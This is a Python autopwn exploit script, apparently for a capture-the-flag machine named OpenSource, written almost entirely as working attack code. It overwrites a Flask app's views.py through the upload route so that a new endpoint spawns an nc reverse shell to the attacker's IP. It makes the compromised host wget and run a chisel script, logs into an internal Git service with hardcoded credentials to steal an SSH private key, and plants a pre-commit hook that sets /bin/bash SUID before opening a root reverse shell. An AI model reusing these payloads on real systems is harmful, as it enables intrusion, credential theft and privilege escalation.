#!/bin/python3 

from pwn import *
import threading
import requests
import http.server
import socketserver
import pdb
import os
from paramiko import SSHClient

def def_handler(sig,frame):
    print("\n[!] Saliendo...")
    sys.exit(1)

#Ctrl+C
signal.signal(signal.SIGINT, def_handler)

if (len(sys.argv) < 2):
    print("Modo de uso: python3 autopwn.py <IP-atacante>")
    sys.exit(1)
else:
    ip_atacante = sys.argv[1]

url = 'http://10.10.11.164'
ip_target = '10.10.11.164'
path = '/upcloud'
shell_port = 9191
root_shell_port = 9222
download_port = 9090
Handler = http.server.SimpleHTTPRequestHandler
id_rsa_path = './id_rsa'
know_host_path = './know_hosts'
hostname = '0.0.0.0'
#ip_atacante = '10.10.14.6'
usr_git = 'dev01'
pwd_git = 'Soulless_Developer#2022'
payload = '''import os

from app.utils import get_file_name
from flask import render_template, request, send_file

from app import app


@app.route('/')
def index():
    return render_template('index.html')


@app.route('/download')
def download():
    return send_file(os.path.join(os.getcwd(), 'app', 'static', 'source.zip'))


@app.route('/upcloud', methods=['GET', 'POST'])
def upload_file():
    if request.method == 'POST':
        f = request.files['file']
        file_name = get_file_name(f.filename)
        file_path = os.path.join(os.getcwd(), 'public', 'uploads', file_name)
        f.save(file_path)
        return render_template('success.html', file_url=request.host_url + 'uploads/' + file_name)
    return render_template('upload.html')


@app.route('/uploads/<path:path>')
def send_report(path):
    path = get_file_name(path)
    return send_file(os.path.join(os.getcwd(), 'public', 'uploads', path))



@app.route('/rs')
def shell():
    os.system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.6 9191 >/tmp/f')
    return 'RCE Finish'

'''

def create_know_hosts_file():
    know_host1 = "10.10.11.164 ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINxEEb33GC5nT5IJ/YY+yDpTKQGLOK1HPsEzM99H4KKA\n"
    know_host2 = "10.10.11.164 ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLA9ak8TUAPl/F77SPc1ut/8B+eOukyC/0lof4IrqJoPJLYusbXk+9u/OgSGp6bJZhotkJUvhC7k0rsA7WX19Y8="
    with open(know_host_path,'w') as know_host_file:
        know_host_file.write(know_host1)
        know_host_file.write(know_host2)


def http_server():
    with socketserver.TCPServer(("0.0.0.0", download_port), Handler) as httpd:
        print("serving at port", download_port)
        httpd.serve_forever()
        server_list.append(httpd)

def makeRequest():
    file = {'file': ('/app/app/views.py', payload)}
    r = requests.post(url + path, files=file)
    #pdb.set_trace()
    sleep(10)
    requests.get(url + '/rs')

def up_localserver_chisel():
    os.system("./chisel server --reverse -p 8000")

def conectChisel(shell):
    #shell.send("cd; wget http://" + ip_atacante + ':' +str(download_port) + '/chisel && wget http:// '+ ip_atacante + ':' +str(download_port) + '/chisel_client.sh && sh chisel_client.sh') #&& ./chisel client '+ ip_atacante + ':8000 R:3000:172.17.0.1:3000')
    shell.send(b'cd;rm chi*; wget http://10.10.14.6:9090/chisel_client.sh && sh chisel_client.sh') #&& ./chisel client '+ ip_atacante + ':8000 R:3000:172.17.0.1:3000')
    #shell.send("cd; wget http://" + ip_atacante + ':' +str(download_port) + '/chisel_client.sh && sh chisel_client.sh')

def getId_rsa():
    s = requests.Session()
    s.get('http://localhost:3000')
    head = {'Content-Type' : 'application/x-www-form-urlencoded'}
    credentials = {'user_name':'dev01','password':'Soulless_Developer#2022'}
    s.post('http://localhost:3000/user/login', credentials, head)
    r = s.get('http://localhost:3000/dev01/home-backup/raw/branch/main/.ssh/id_rsa')
    return r.text
    pdb.set_trace()

def connectSSH(p2):
    create_know_hosts_file()
    ssh = SSHClient()
    p2.status('Entabling ssh conection')
    ssh.load_host_keys(know_host_path)
    ssh.connect(ip_target, username='dev01', key_filename=id_rsa_path)
    payloadLPE = "echo '#!/bin/bash\nchmod 4755 /bin/bash' > /home/dev01/.git/hooks/pre-commit; chmod +x /home/dev01/.git/hooks/pre-commit" 
    p2.status("send LPE payload")
    stdin, stdout, stderr = ssh.exec_command(payloadLPE)
    p2.status('Waiting cronjob...')
    sleep(65)
    revshell_payload = 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc '+ip_atacante+ ' ' + str(root_shell_port) + ' >/tmp/f'
    stdin, stdout, stderr = ssh.exec_command(revshell_payload)

def attack_OpenSource():
    p1 = log.progress("Autopwm")
    p2 = log.progress('RCE')
    sleep(2)
    p2.status("Send payload SSTI...")
    try:
        p1.status('raising download server')
        threading.Thread(target=http_server).start()
        thread = threading.Thread(target=makeRequest, args=()).start()
        sleep(2)
        p2.status("Waiting for connection")
    #thread.join()
    except Exception as e:
        log.error(str(e))
    shell = listen(shell_port, timeout=30).wait_for_connection()
    if shell.sock is None:
        p2.failure("connection refused")
        sys.exit(1)
    else:
        p1.status('Conected to container')
        p2.status("Conected")
        sleep(2)
        p2.status("Uploading chisel and connecting")
        #threading.Thread(target=up_localserver_chisel(), args=()).start()
        #threading.Thread(target=conectChisel(shell), args=(shell)).start()
        shell.send(b'cd; rm chi*; wget http://10.10.14.6:9090/chisel_client.sh && sh chisel_client.sh \n') #&& ./chisel client '+ ip_atacante + ':8000 R:3000:172.17.0.1:3000')
        #chisel_thread.start()
        sleep(30)
        p2.status("chisel up")
        #chisel_thread.join()
        sleep(1)
        p2.status("Downloading id_rsa user")
        id_rsaDev01 = getId_rsa()
        with open(id_rsa_path,'w') as id_rsa:
            id_rsa.write(id_rsaDev01)
        p1.status('LPE in progress...')
        connectSSH(p2)
        shell_root = listen(root_shell_port, timeout=80).wait_for_connection()
        if shell_root.sock is None:
            p2.failure("root connection refused")
        else:
            p1.success('[!] ROOT ACCESS!')
            p2.success('[!] ROOT ACCESS!')
            shell_root.send(b'bash -p\n')
            shell_root.interactive()

if __name__ == "__main__":
    attack_OpenSource()
